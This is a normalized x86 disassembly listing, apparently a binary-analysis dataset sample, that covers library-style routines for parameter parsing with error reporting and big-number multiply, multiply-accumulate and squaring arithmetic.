test edi edi
je r-xdata
test edi edi
jne r-xdata
push 0x60
push r--data
push 0x10
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
push edi
call sub_10030980
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
call sub_1001e3c0
test eax eax
mov [ esi + 0xc ] eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x18 ]
neg eax
sbb eax eax
and eax 0x10
test edi edi
mov [ esi ] eax
je r-xdata
push esi
call sub_1001d740
add esp 0x4
test edi edi
je r-xdata
mov ecx [ ebx ]
mov [ esi + 0x4 ] ecx
mov [ ebx ] 0x0
mov [ esi + 0x4 ] edi
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
push edi
call sub_10030910
add esp 0x4
mov [ esi + 0x8 ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x4 ]
mov eax esi
mov [ esi + 0x8 ] edx
pop edi
mov [ ebx + 0x4 ] 0x0
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
sub_100522c0
push esi
mov esi [ esp + 0xc ]
lea eax [ esp + 0x10 ]
mov ecx [ esi ]
push eax
push ecx
push r--data
call sub_100563f0
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x1c ]
push edx
push eax
push r--data
call sub_100563f0
mov eax [ esp + 0x28 ]
add esp 0x18
pop esi
retn
sub_10052300
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
push r--data
call sub_10033120
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0x10 ] esi
jne r-xdata
mov eax [ esp + 0x20 ]
xor ebx ebx
push eax
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x6d
push r--data
push 0x41
push 0x92
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
push ebx
push ecx
call sub_1001e7c0
mov ebp eax
add esp 0x8
mov esi r--data
mov edi [ ebp + 0x4 ]
mov eax edi
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp [ esi ] 0x0
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push 0x7f
push r--data
push 0x97
push 0x92
push 0x22
call sub_1001de60
add esp 0x14
jmp r-xdata
mov esi r--data
mov eax edi
mov eax [ esp + 0x10 ]
push eax
push ebp
call sub_10056890
add esp 0x8
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push r--data
push esi
call sub_10033840
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov esi [ esp + 0x10 ]
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push 0x79
push r--data
push 0x6a
push 0x92
push 0x22
call sub_1001de60
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x4 ]
mov ecx [ ebp ]
push edx
push r--data
push eax
push r--data
push ecx
push r--data
push 0x6
call sub_1001e1a0
add esp 0x30
mov eax [ esp + 0x10 ]
add eax 0x4
push eax
push ebp
call sub_10056890
add esp 0x8
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov ecx [ esp + 0x20 ]
inc ebx
push ecx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi [ esp + 0x10 ]
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_100524b0
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x24 ]
mov ebx [ eax + 0x40 ]
push edi
xor ebp ebp
push esi
mov [ esp + 0x14 ] ebp
call sub_1001e7b0
add esp 0x4
test eax eax
jne r-xdata
push sub_100526e0
call sub_1001e440
push esi
mov [ ebx + 0x8 ] eax
mov [ esp + 0x1c ] ebp
call sub_1001e7b0
add esp 0x8
test eax eax
jle r-xdata
mov eax [ esp + 0x24 ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ eax + 0x28 ]
or ch 0x8
mov [ eax + 0x28 ] ecx
mov [ esp + 0x10 ] 0x1
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x28 ]
push ecx
push edx
call sub_1001e7c0
mov edi eax
mov eax [ edi + 0x4 ]
push eax
call sub_10022ae0
add esp 0xc
cmp eax 0x2ea
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jg r-xdata
mov eax [ ebp ]
test eax eax
je r-xdata
test ebp ebp
je r-xdata
mov ecx [ edi ]
push ecx
call sub_10022ae0
add esp 0x4
cmp eax 0x2ea
je r-xdata
mov eax [ esp + 0x28 ]
push sub_1005e770
push eax
call sub_1001e730
mov eax [ esp + 0x18 ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov edx [ ebx + 0x8 ]
push sub_10052700
push edx
call sub_1001e730
add esp 0x8
mov [ ebx + 0x8 ] 0x0
push ebp
call sub_1001d740
add esp 0x4
push eax
call sub_10030910
add esp 0x4
mov ecx [ ebx + 0x8 ]
mov edx [ edi + 0x4 ]
lea eax [ esp + 0x18 ]
mov [ esp + 0x18 ] edx
push eax
push ecx
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
je r-xdata
mov eax [ edi ]
push eax
push ebx
call sub_100354d0
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov edx [ ebx + 0x8 ]
push eax
push edx
call sub_1001e7c0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi ]
or al 0x1
mov [ esi ] eax
mov eax [ ebx ]
test eax eax
je r-xdata
push 0x9d
push r--data
push 0x8
call sub_1001d4c0
mov ebp eax
add esp 0xc
test ebp ebp
je r-xdata
mov esi [ esp + 0x14 ]
mov ecx [ esp + 0x28 ]
inc esi
push ecx
mov [ esp + 0x18 ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov ecx [ eax ]
mov edx [ edi ]
and ecx 0x10
push ecx
push edx
push esi
call sub_100521d0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov edx [ edi + 0x4 ]
push ebp
mov [ ebp ] edx
mov [ edi + 0x4 ] 0x0
mov [ ebp + 0x4 ] esi
mov eax [ ebx + 0x8 ]
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebx ]
push esi
mov ecx [ eax + 0x8 ]
mov [ esi + 0x8 ] ecx
mov [ edi ] 0x0
mov edx [ esi ]
or edx 0x6
mov [ esi ] edx
mov edx [ ebx + 0x4 ]
push edx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
xor ebp ebp
push esi
call sub_10052180
add esp 0x4
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ esi + 0xc ]
push eax
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
sub_10052700
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
push esi
call sub_1001d740
add esp 0x4
pop esi
retn
push eax
call sub_10030910
add esp 0x4
sub_100527c0
mov eax 0x18
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
call sub_1001e3c0
xor esi esi
mov [ esp + 0x20 ] eax
cmp eax esi
jne r-xdata
mov eax [ esp + 0x34 ]
push eax
call sub_100568e0
mov ebx eax
add esp 0x4
cmp ebx esi
mov [ esp + 0x10 ] ebx
jne r-xdata
push 0x8f
push r--data
push 0x41
push 0x82
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
push ebx
mov [ esp + 0x28 ] esi
mov [ esp + 0x20 ] esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x94
push r--data
push 0x22
push 0x82
push 0x22
call sub_1001de60
add esp 0x14
jmp r-xdata
push sub_10056020
push ebx
call sub_1001e730
mov eax [ esp + 0x28 ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov ecx [ esp + 0x1c ]
push ecx
push ebx
call sub_1001e7c0
mov edi eax
add esp 0x8
mov eax [ edi + 0x8 ]
test eax eax
jne r-xdata
push sub_10056020
push ebx
call sub_1001e730
mov edx [ esp + 0x28 ]
push sub_10052740
push edx
call sub_1001e730
add esp 0x10
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
push 0x9b
push r--data
push 0x86
push 0x82
push 0x22
call sub_1001de60
mov edx [ edi + 0x8 ]
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
push edx
push r--data
push eax
push r--data
push ecx
push r--data
push 0x6
call sub_1001e1a0
add esp 0x30
jmp r-xdata
mov ebp [ edi + 0x4 ]
test ebp ebp
je r-xdata
mov esi r--data
mov eax ebp
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
cmp [ ebp ] 0x40
jne r-xdata
mov [ esp + 0x24 ] 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push 0x0
push ebp
call sub_10022b70
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
mov ebx [ esp + 0x30 ]
inc ebp
push ebp
push ebx
call sub_1005e650
mov esi eax
add esp 0x8
test esi esi
mov [ esp + 0x18 ] esi
je r-xdata
mov esi [ esp + 0x1c ]
push ebx
inc esi
mov [ esp + 0x20 ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push 0xb1
push r--data
push 0x6e
push r--data
call sub_10033120
mov esi eax
add esp 0x4
mov [ esi ] ebx
push 0xa7
push r--data
push 0x87
jmp r-xdata
push r--data
call sub_10033120
add esp 0x4
mov [ esp + 0x34 ] eax
test eax eax
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
push r--data
push esi
call sub_10033840
push 0xba
push r--data
push 0x41
push 0x82
push 0x22
call sub_1001de60
add esp 0x1c
jmp r-xdata
mov ebx [ esp + 0x10 ]
push 0x82
push 0x22
call sub_1001de60
mov edx [ edi + 0x8 ]
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
push edx
push r--data
push eax
push r--data
push ecx
push r--data
push 0x6
call sub_1001e1a0
add esp 0x30
push 0x107
push r--data
push 0x41
jmp r-xdata
push esi
mov [ esp + 0x18 ] 0x0
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov ebx [ esp + 0x10 ]
push 0x83
push 0x22
call sub_1001de60
add esp 0x14
mov esi [ esp + 0x34 ]
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
call sub_1001e7c0
mov esi eax
add esp 0x8
mov edi r--data
mov ebp [ esi + 0x4 ]
mov eax ebp
jmp r-xdata
mov eax [ esp + 0x18 ]
push eax
push ebx
call sub_1005e6a0
add esp 0x8
test esi esi
je r-xdata
push 0x100
push r--data
push 0x8b
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov ecx [ esp + 0x20 ]
push esi
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push r--data
push ebp
call sub_100570e0
add esp 0x8
test eax eax
jne r-xdata
push eax
mov eax [ esi + 0x8 ]
push eax
call sub_10022b70
add esp 0x8
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ edi + 0x1 ]
jne r-xdata
mov ecx [ esi + 0x4 ]
push r--data
push ecx
call sub_100570e0
add esp 0x8
test eax eax
jne r-xdata
mov edi [ esp + 0x34 ]
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
push 0xd3
push r--data
push 0x6e
jmp r-xdata
mov ecx [ esp + 0x34 ]
mov [ ecx ] eax
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
push 0xf9
push r--data
push 0x8a
mov eax [ esi + 0x8 ]
cmp [ eax ] 0x40
jne r-xdata
push r--data
call sub_10033120
mov edi eax
add esp 0x4
test edi edi
je r-xdata
call sub_1001e3c0
mov [ edi + 0x4 ] eax
push 0x83
push 0x22
call sub_1001de60
mov edx [ esi + 0x8 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push edx
push r--data
push eax
push r--data
push ecx
push r--data
push 0x6
call sub_1001e1a0
add esp 0x30
jmp r-xdata
mov esi [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
inc esi
push ecx
mov [ esp + 0x18 ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ edi ]
jne r-xdata
mov edx [ esp + 0x34 ]
push r--data
push edx
call sub_10033840
add esp 0x8
xor esi esi
push 0xe6
push r--data
push 0x89
jmp r-xdata
inc eax
push eax
push ebx
call sub_1005e650
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov edx [ esp + 0x34 ]
push edi
mov eax [ edx + 0x4 ]
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push 0xec
push r--data
push 0x87
jmp r-xdata
mov edx [ esp + 0x24 ]
push edx
push edi
push ebx
call sub_10052ce0
push edi
push ebx
mov esi eax
call sub_1005e6a0
add esp 0x14
test esi esi
je r-xdata
push 0xa4
call sub_10022900
push 0x16
mov [ edi ] eax
call sub_1002edc0
mov edx eax
or ecx 0xffffffff
mov [ edi + 0x4 ] edx
mov esi [ esi + 0x8 ]
mov edi esi
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
push edx
call sub_1002ec90
add esp 0x14
test eax eax
je r-xdata
mov edi [ esp + 0x34 ]
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ edi + 0x4 ]
push esi
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
call sub_1001e3c0
mov [ edi + 0x4 ] eax
sub_10052ce0
mov eax 0xc
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
push r--data
call sub_10033120
mov edi eax
add esp 0x4
test edi edi
mov [ esp + 0x18 ] edi
je r-xdata
push 0x14c
push r--data
push 0x41
jmp r-xdata
push 0xa5
call sub_10022900
push r--data
mov [ edi ] eax
call sub_10033120
mov esi eax
add esp 0x8
test esi esi
mov [ esp + 0x10 ] esi
je r-xdata
push 0x84
push 0x22
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x24 ]
xor ebx ebx
push eax
mov [ edi + 0x4 ] esi
mov [ esp + 0x18 ] ebx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
push ebx
push ecx
call sub_1001e7c0
mov ebp eax
add esp 0x8
mov esi r--data
mov edi [ ebp + 0x4 ]
mov eax edi
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push 0x145
push r--data
push 0x8e
cmp [ eax ] 0x0
jne r-xdata
mov esi r--data
mov eax edi
push 0x1a
call sub_1002edc0
mov edx eax
mov eax [ esp + 0x14 ]
or ecx 0xffffffff
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x8 ]
mov edi esi
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
push edx
call sub_1002ec90
add esp 0x10
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi r--data
mov eax edi
mov esi [ esp + 0x10 ]
mov edx [ esi ]
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov edx [ esp + 0x24 ]
inc ebx
push edx
mov [ esp + 0x18 ] ebx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
push r--data
call sub_10033120
mov edx eax
add esp 0x4
test edx edx
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi [ esp + 0x10 ]
jmp r-xdata
push 0x13d
push r--data
push 0x8a
mov edi [ esp + 0x10 ]
mov esi [ edi ]
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov ecx [ edx ]
mov [ ecx + 0x4 ] 0x1a
mov eax [ edx ]
mov [ eax + 0x4 ] 0x16
jmp r-xdata
mov [ esi ] edx
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov eax [ esp + 0x18 ]
push r--data
push eax
call sub_10033840
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_100568e0
mov edi eax
add esp 0x4
test edi edi
je r-xdata
push r--data
call sub_10033120
mov esi eax
add esp 0x4
test esi esi
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
jmp r-xdata
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
mov edx [ edx ]
not ecx
dec ecx
push ecx
push esi
push edx
call sub_1002ec90
add esp 0xc
test eax eax
je r-xdata
push 0x134
push r--data
push 0x8d
jmp r-xdata
push edi
call sub_1001e7b0
add esp 0x4
test eax eax
je r-xdata
mov [ edi ] esi
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
push 0x84
push 0x22
call sub_1001de60
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x4 ]
mov edx [ ebp ]
push eax
push r--data
push ecx
push r--data
push edx
push r--data
push 0x6
call sub_1001e1a0
add esp 0x30
jmp r-xdata
mov ebx [ esi + 0x4 ]
push edi
xor esi esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov esi 0x1
push esi
push edi
call sub_1001e7c0
mov ecx [ eax + 0x4 ]
push ecx
push 0x0
call sub_100562e0
add esp 0x10
test eax eax
je r-xdata
mov ebx [ esp + 0x14 ]
push 0x15d
push r--data
push 0x8c
jmp r-xdata
push eax
push ebx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push 0x85
push 0x22
call sub_1001de60
add esp 0x14
push sub_1002ee10
push ebx
call sub_1001e730
add esp 0x8
xor esi esi
jmp r-xdata
push 0x165
push r--data
push 0x41
push edi
inc esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
push sub_10056020
push edi
call sub_1001e730
add esp 0x8
test esi esi
je r-xdata
sub_10053070
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x18 ]
mov [ esp ] 0x0
push eax
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax 0x1
add esp 0x10
retn
push ebx
push ebp
push esi
mov esi [ esp + 0x28 ]
push edi
mov edi [ esp + 0x10 ]
mov edx [ esp + 0x28 ]
inc edi
push edx
mov [ esp + 0x14 ] edi
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
push ebp
mov [ esp + 0x30 ] 0x0
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x28 ]
push ecx
push edx
call sub_1001e7c0
mov ebx [ esp + 0x38 ]
push rw-data
push ebx
push r--data
push esi
mov edi eax
call sub_10026b40
mov eax [ edi ]
push eax
push esi
call sub_100305b0
push r--data
push esi
call sub_10020a80
mov ebp [ edi + 0x4 ]
add esp 0x28
test ebp ebp
mov [ esp + 0x14 ] ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x10
retn
mov ecx [ esp + 0x2c ]
push ecx
push ebp
call sub_1001e7c0
mov edi eax
mov edx [ edi ]
push edx
call sub_10022ae0
add esp 0xc
sub eax 0xa4
je r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x8 ]
lea eax [ ebx + 0x2 ]
push ecx
push rw-data
push eax
push r--data
push esi
call sub_10026b40
add esp 0x14
jmp r-xdata
dec eax
push rw-data
je r-xdata
mov edi [ esp + 0x2c ]
push ebp
inc edi
mov [ esp + 0x30 ] edi
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
add ebx 0x2
push ebx
push r--data
push esi
call sub_10026b40
mov eax [ edi + 0x4 ]
add esp 0x10
lea ebp [ ebx + 0x2 ]
mov [ esp + 0x1c ] eax
mov edi [ eax ]
mov [ esp + 0x18 ] ebp
test edi edi
je r-xdata
lea eax [ ebx + 0x4 ]
push eax
push r--data
push esi
call sub_10026b40
mov ecx [ edi ]
push ecx
push esi
call sub_100305b0
push r--data
push esi
call sub_10020a80
add esp 0x20
jmp r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ edx + 0x8 ]
push eax
push rw-data
push ebp
push r--data
push esi
call sub_10026b40
mov ecx [ edi + 0x4 ]
push ecx
call sub_1001e7b0
add esp 0x18
cmp eax 0x1
mov eax r--data
jg r-xdata
mov ebx [ esp + 0x30 ]
mov ebp [ esp + 0x14 ]
mov edx [ eax + 0x8 ]
push edx
push rw-data
push ebp
push r--data
push esi
call sub_10026b40
add esp 0x14
push eax
push rw-data
push ebp
push r--data
push esi
call sub_10026b40
mov edx [ edi + 0x4 ]
xor ebx ebx
push edx
call sub_1001e7b0
add esp 0x18
test eax eax
jle r-xdata
mov eax rw-data
push r--data
push esi
call sub_10020a80
mov eax [ esp + 0x24 ]
add esp 0x8
mov eax [ edi + 0x4 ]
push ebx
push eax
call sub_1001e7c0
add esp 0x8
mov ebp eax
test ebx ebx
je r-xdata
push ebp
push 0x0
call sub_10056280
mov ebp eax
push ebp
push esi
call sub_10020a80
push ebp
call sub_1001d740
mov ecx [ edi + 0x4 ]
inc ebx
push ecx
call sub_1001e7b0
add esp 0x18
cmp ebx eax
jl r-xdata
push r--data
push esi
call sub_10020a80
add esp 0x8
mov ebp [ esp + 0x18 ]
sub_100532d0
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x10 ]
push ebx
push ebp
push esi
test eax eax
push edi
mov [ esp + 0x10 ] 0x0
jg r-xdata
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
test eax 0xfffffffc
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ edi ]
xor ebp ebp
push ebp
push ecx
push ebp
push eax
call sub_1001d090
mov ebx edx
mov edx [ esi ]
xor ecx ecx
add eax edx
adc ebx ecx
mov ecx [ esp + 0x10 ]
xor edx edx
add eax ecx
mov ecx [ esp + 0x24 ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
push ebp
push ecx
push edx
push eax
adc ebx edx
call sub_1001d090
mov ecx [ esi + 0x4 ]
mov ebp edx
xor edx edx
add eax ebx
adc ebp edx
add eax ecx
adc ebp edx
mov edx [ esp + 0x24 ]
mov [ esi + 0x4 ] eax
mov ecx [ edi + 0x8 ]
xor eax eax
push eax
push edx
push eax
push ecx
call sub_1001d090
xor ecx ecx
mov ebx edx
mov edx [ esi + 0x8 ]
add eax ebp
adc ebx ecx
add eax edx
adc ebx ecx
mov [ esi + 0x8 ] eax
mov edx [ edi + 0xc ]
xor eax eax
push eax
mov eax [ esp + 0x28 ]
push eax
push ecx
push edx
call sub_1001d090
xor ecx ecx
add eax ebx
adc edx ecx
mov ecx [ esi + 0xc ]
xor ebx ebx
add eax ecx
mov [ esi + 0xc ] eax
mov eax [ esp + 0x20 ]
adc edx ebx
sub eax 0x4
add edi 0x10
add esi 0x10
test eax 0xfffffffc
mov [ esp + 0x10 ] edx
mov [ esp + 0x20 ] eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esp + 0x24 ]
mov edx [ edi ]
xor ebp ebp
push ebp
push eax
push ebp
push edx
call sub_1001d090
mov ecx [ esi ]
mov ebx edx
xor edx edx
add eax ecx
adc ebx edx
mov edx [ esp + 0x10 ]
xor ecx ecx
add eax edx
mov [ esi ] eax
mov eax [ esp + 0x20 ]
adc ebx ecx
dec eax
mov [ esp + 0x20 ] eax
jne r-xdata
mov eax [ esp + 0x24 ]
mov edx [ edi + 0x4 ]
push ebp
push eax
push 0x0
push edx
call sub_1001d090
mov ecx [ esi + 0x4 ]
mov ebp edx
xor edx edx
add eax ecx
adc ebp edx
mov edx [ esp + 0x20 ]
xor ecx ecx
add eax ebx
adc ebp ecx
dec edx
test edx edx
mov [ esi + 0x4 ] eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
pop ecx
retn
mov edx [ esp + 0x24 ]
mov ecx [ edi + 0x8 ]
xor eax eax
push eax
push edx
push eax
push ecx
call sub_1001d090
mov ecx [ esi + 0x8 ]
xor edi edi
add eax ecx
adc edx edi
xor ecx ecx
add eax ebp
pop edi
mov [ esi + 0x8 ] eax
pop esi
adc edx ecx
pop ebp
mov eax edx
pop ebx
pop ecx
retn
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_10053470
mov eax 0xc
call sub_1001d0d0
mov eax [ esp + 0x18 ]
push ebx
push ebp
push esi
test eax eax
push edi
mov [ esp + 0x10 ] 0x0
jg r-xdata
mov ebx [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x20 ]
test eax 0xfffffffc
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn
test eax eax
je r-xdata
mov ecx [ esi ]
xor eax eax
push eax
push ebx
push eax
push ecx
call sub_1001d090
mov ecx [ esp + 0x10 ]
mov ebp edx
xor edx edx
add eax ecx
adc ebp edx
mov [ edi ] eax
mov ecx [ esi + 0x4 ]
xor eax eax
push eax
push ebx
push eax
push ecx
call sub_1001d090
xor ecx ecx
add eax ebp
adc edx ecx
mov [ edi + 0x4 ] eax
xor eax eax
mov [ esp + 0x18 ] edx
mov edx [ esi + 0x8 ]
push eax
push ebx
push eax
push edx
call sub_1001d090
mov ebp edx
mov edx [ esp + 0x18 ]
xor ecx ecx
add eax edx
adc ebp ecx
mov [ edi + 0x8 ] eax
mov edx [ esi + 0xc ]
xor eax eax
push eax
push ebx
push eax
push edx
call sub_1001d090
xor ecx ecx
add eax ebp
mov [ edi + 0xc ] eax
mov eax [ esp + 0x28 ]
adc edx ecx
sub eax 0x4
add esi 0x10
add edi 0x10
test eax 0xfffffffc
mov [ esp + 0x10 ] edx
mov [ esp + 0x28 ] eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov edx [ esi ]
xor ebp ebp
push ebp
push ebx
push ebp
push edx
call sub_1001d090
xor ecx ecx
add eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x28 ]
adc edx ecx
dec eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x28 ] eax
jne r-xdata
mov edx [ esi + 0x4 ]
push ebp
push ebx
push 0x0
push edx
call sub_1001d090
mov ebp edx
mov edx [ esp + 0x18 ]
xor ecx ecx
add eax edx
mov edx [ esp + 0x28 ]
mov [ edi + 0x4 ] eax
adc ebp ecx
dec edx
test edx edx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax edx
pop ebx
add esp 0xc
retn
mov ecx [ esi + 0x8 ]
xor eax eax
push eax
push ebx
push eax
push ecx
call sub_1001d090
xor ecx ecx
add eax ebp
adc edx ecx
mov [ edi + 0x8 ] eax
mov [ esp + 0x10 ] edx
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0xc
retn
sub_100535d0
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
test ebx 0xfffffffc
je r-xdata
test ebx ebx
je r-xdata
mov eax [ edi ]
xor ecx ecx
push ecx
push eax
push ecx
push eax
call sub_1001d090
mov [ esi ] eax
mov [ esi + 0x4 ] edx
mov eax [ edi + 0x4 ]
xor ecx ecx
push ecx
push eax
push ecx
push eax
call sub_1001d090
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax [ edi + 0x8 ]
xor ecx ecx
push ecx
push eax
push ecx
push eax
call sub_1001d090
